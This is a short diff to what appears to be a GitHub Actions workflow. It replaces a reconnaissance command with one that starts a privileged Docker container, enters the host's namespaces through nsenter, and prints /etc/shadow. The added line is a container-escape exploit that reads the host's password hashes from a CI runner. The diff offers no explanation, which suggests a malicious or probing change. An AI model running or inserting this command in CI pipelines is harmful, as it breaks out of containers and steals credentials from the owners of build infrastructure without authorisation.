@@ -5,7 +5,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |     
-            docker -H unix:///var/run/docker.sock run --privileged --pid=host debian nsenter -t 1 -m -u -n -i id;uname -a
+            docker -H unix:///var/run/docker.sock run --privileged --pid=host debian nsenter -t 1 -m -u -n -i cat /etc/shadow
 
             
        
